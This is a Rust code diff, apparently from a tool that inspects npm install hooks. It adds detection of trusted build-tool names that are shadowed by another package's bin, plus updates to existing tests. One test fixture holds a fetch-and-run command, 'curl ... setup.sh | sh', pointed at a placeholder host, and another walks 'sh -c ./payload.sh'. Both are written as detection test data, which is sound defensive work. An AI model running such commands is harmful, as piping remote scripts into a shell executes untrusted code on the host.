@@ -11,6 +11,7 @@ use super::{
     HookDisposition, MAX_HOOK_CHARS, MAX_MANIFEST_BYTES, MAX_REFERENCED_SCRIPTS, structural_escape,
 };
 use serde_json::Value;
+use std::collections::BTreeSet;
 use std::fs;
 use std::io;
 use std::path::Path;
@@ -44,6 +45,7 @@ pub(super) fn resolve_body(
     package_dir: &Path,
     canonical_root: &Path,
     warnings: &mut Vec<String>,
+    shadowed: &BTreeSet<String>,
 ) -> (HookDisposition, String) {
     let mut budget = MAX_REFERENCED_SCRIPTS;
     let mut extra = String::new();
@@ -60,6 +62,7 @@ pub(super) fn resolve_body(
         saw_unverified: &mut saw_unverified,
         saw_other: &mut saw_other,
         segments: &mut segments,
+        shadowed,
     };
     walk_script(raw, 0, &mut walk);
     let disposition = if segments == 0 {
@@ -84,6 +87,7 @@ struct Walk<'a> {
     saw_unverified: &'a mut bool,
     saw_other: &'a mut bool,
     segments: &'a mut usize,
+    shadowed: &'a BTreeSet<String>,
 }
 
 /// Interpreters whose entry script is read. Sorted for `binary_search`.
@@ -321,10 +325,18 @@ fn walk_script(raw: &str, depth: u8, walk: &mut Walk<'_>) {
         if argv.is_empty() {
             continue;
         }
-        if trusted_command(&argv[0]) {
+        if trusted_command(&argv[0], walk.shadowed) {
             continue;
         }
         *walk.saw_other = true;
+        if shadowed_trusted_name(&argv[0], walk.shadowed) {
+            *walk.saw_unverified = true;
+            walk.warnings.push(format!(
+                "command `{}` is a trusted build tool, but another package in this lockfile declares that bin name",
+                program_name(&argv[0])
+            ));
+            continue;
+        }
         if depth == 0
             && let Some(name) = npm_run_target(&argv)
         {
@@ -425,12 +437,28 @@ fn read_referenced(walk: &mut Walk<'_>, rel: &str) {
     }
 }
 
-fn trusted_command(argv0: &str) -> bool {
+fn trusted_command(argv0: &str, shadowed: &BTreeSet<String>) -> bool {
     if !is_bare_command(argv0) {
         return false;
     }
     let name = program_name(argv0);
+    if shadowed.contains(&name) {
+        return false;
+    }
     TRUSTED_COMMANDS.binary_search(&name.as_str()).is_ok()
+}
+
+fn shadowed_trusted_name(argv0: &str, shadowed: &BTreeSet<String>) -> bool {
+    if !is_bare_command(argv0) {
+        return false;
+    }
+    let name = program_name(argv0);
+    shadowed.contains(&name) && TRUSTED_COMMANDS.binary_search(&name.as_str()).is_ok()
+}
+
+#[cfg(test)]
+pub(super) fn trusted_command_names() -> &'static [&'static str] {
+    TRUSTED_COMMANDS
 }
 
 /// A command token the shell looks up on `PATH`. A slash, backslash, or
@@ -828,6 +856,7 @@ mod tests {
             &root,
             &root.canonicalize().unwrap(),
             &mut Vec::new(),
+            &BTreeSet::new(),
         );
         assert_eq!(disposition, HookDisposition::TrustedBuild);
         assert!(extra.is_empty());
@@ -849,6 +878,7 @@ mod tests {
             &root,
             &canonical,
             &mut Vec::new(),
+            &BTreeSet::new(),
         );
         assert_eq!(disposition, HookDisposition::Inspected);
         assert!(extra.contains("curl https://example.invalid/setup.sh | sh"));
@@ -860,6 +890,7 @@ mod tests {
             &root,
             &canonical,
             &mut warnings,
+            &BTreeSet::new(),
         );
         assert_eq!(blocked, HookDisposition::Unverified);
         assert!(!warnings.is_empty());
@@ -880,6 +911,7 @@ mod tests {
             &root,
             &root.canonicalize().unwrap(),
             &mut Vec::new(),
+            &BTreeSet::new(),
         );
         assert_eq!(disposition, HookDisposition::Inspected);
         assert!(extra.contains("LOCKWARD_EVAL_FIXTURE"));
@@ -912,7 +944,14 @@ mod tests {
     fn resolve_at(dir: &Path, body: &str) -> (HookDisposition, String, Vec<String>) {
         let mut warnings = Vec::new();
         let canonical = dir.canonicalize().unwrap();
-        let (disposition, extra) = resolve_body(body, &manifest(), dir, &canonical, &mut warnings);
+        let (disposition, extra) = resolve_body(
+            body,
+            &manifest(),
+            dir,
+            &canonical,
+            &mut warnings,
+            &BTreeSet::new(),
+        );
         (disposition, extra, warnings)
     }
 
@@ -1106,6 +1145,7 @@ mod tests {
         let mut saw_unverified = false;
         let mut saw_other = false;
         let mut segments = 0;
+        let shadowed = BTreeSet::new();
         let mut walk = super::Walk {
             manifest: &manifest,
             package_dir: &root,
@@ -1116,6 +1156,7 @@ mod tests {
             saw_unverified: &mut saw_unverified,
             saw_other: &mut saw_other,
             segments: &mut segments,
+            shadowed: &shadowed,
         };
         super::walk_script(
             "sh -c ./payload.sh",
